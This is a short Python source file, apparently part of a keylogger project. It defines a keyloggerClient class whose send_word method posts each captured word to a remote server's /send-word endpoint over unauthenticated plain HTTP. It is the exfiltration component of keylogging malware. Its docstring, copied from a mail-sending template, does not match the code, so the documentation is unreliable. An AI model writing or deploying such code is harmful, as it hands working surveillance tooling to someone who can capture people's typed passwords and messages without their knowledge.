    
from pprint import pprint
import json
import requests

class keyloggerClient():

    def __init__(self, username, serv_address, serv_password):
        self.serv_password = serv_password
        self.username = username
        self.serv_address = serv_address
    """
    Summary: Sends a POST message to the server to add mail
    Args:
        address (string): Target mailbox server to send mail to in format ip_addr:port
        subject (string): Message subject
        body (string): Message body
    """

    # This header sets the HTTP request's mimetype to `application/json`.
    # This means the payload of the HTTP message will be formatted as a
    # JSON object
    def send_word(self, word):
        headers = {
            'Content-Type': 'application/json',
            'Authorization': None   # not using HTTP secure
        }

        # The payload of our message starts as a simple dictionary. Before sending
        # the HTTP message, we will format this into a JSON object
        payload = {
            'word': word,
        }

        # Send an HTTP POST message and block until a response is given.
        # Note: requests is NOT the same thing as the request from the Flask
        # library.
        response = requests.post("http://{}/send-word".format(self.serv_address),
                                 headers=headers,
                                 data=json.dumps(payload))

        # Print the JSON object from the HTTP response in a pretty format
        pprint(response.json())
